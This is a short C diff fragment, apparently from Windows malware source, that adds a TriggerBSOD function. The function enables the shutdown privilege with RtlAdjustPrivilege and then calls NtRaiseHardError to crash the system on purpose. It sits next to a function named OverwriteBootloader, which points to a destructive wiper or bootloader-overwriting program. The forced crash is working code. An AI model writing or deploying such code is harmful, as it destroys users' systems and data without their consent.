@@ -75,3 +75,7 @@ BOOL OverwriteBootloader() {
     }
 }
 
+void TriggerBSOD() {
+    RtlAdjustPrivilege(19, TRUE, FALSE, NULL);
+    NtRaiseHardError(STATUS_INTEGER_DIVIDE_BY_ZERO, 0, 0, NULL, 6, NULL);
+}
